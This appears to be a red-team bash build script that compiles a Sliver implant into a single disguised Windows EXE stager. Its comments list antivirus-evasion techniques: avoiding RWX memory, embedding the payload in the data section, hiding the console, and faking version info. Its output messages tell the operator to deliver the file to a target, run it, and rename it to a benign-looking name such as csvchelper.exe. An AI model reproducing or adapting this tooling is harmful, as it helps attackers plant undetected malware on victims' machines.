#!/usr/bin/env bash
#
# bundle-stager.sh — compile a self-contained EXE stager with the PICO embedded
#
# Replaces bundle-implant.sh / run.x64.exe for engagements where the Crystal
# Palace demo stager (run.x64.exe) is flagged by Defender (Wacatac.B!ml).
# The output is a single EXE: no external PICO file, no ReadFile at runtime.
#
# Evasion improvements over run.x64.exe:
#   - RW → RX memory transition (no PAGE_EXECUTE_READWRITE)
#   - PICO embedded in .data section (no "read file + execute" pattern)
#   - GUI subsystem (no console window)
#   - Version info resource (configurable cover identity)
#   - advapi32 import widens the import table
#
# Usage:
#   ./bundle-stager.sh <implant.crystal.bin> [output.exe]
#
# Typical flow:
#   ./generate-implant.sh --dll /tmp/sliver.dll build/sliver.crystal.bin
#   ./bundle-stager.sh build/sliver.crystal.bin build/csvchelper.exe

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

PICO="${1:?Usage: bundle-stager.sh <implant.crystal.bin> [output.exe]}"
OUTPUT="${2:-$SCRIPT_DIR/build/stager.exe}"

if [[ ! -f "$PICO" ]]; then
    echo "error: PICO not found: $PICO" >&2
    exit 2
fi

PICO_ABS="$(cd "$(dirname "$PICO")" && pwd)/$(basename "$PICO")"
BUILD_DIR="$(cd "$(dirname "$OUTPUT")" && pwd)"
OUTPUT_ABS="$BUILD_DIR/$(basename "$OUTPUT")"

mkdir -p "$BUILD_DIR"

echo "[*] Embedding PICO and compiling stager..."
echo "    PICO:   $PICO_ABS ($(wc -c < "$PICO_ABS") bytes)"
echo "    Output: $OUTPUT_ABS"

make -C "$SCRIPT_DIR/stager" \
    PICO="$PICO_ABS" \
    OUTPUT="$OUTPUT_ABS"

SIZE=$(wc -c < "$OUTPUT_ABS")
echo ""
echo "[+] Stager ready: $OUTPUT_ABS ($SIZE bytes)"
echo ""
echo "    Deliver this single file to the target and execute it."
echo "    No additional files required."
echo ""
echo "    Rename to match resource.rc OriginalFilename for best results:"
echo "    e.g. mv $(basename "$OUTPUT_ABS") csvchelper.exe"
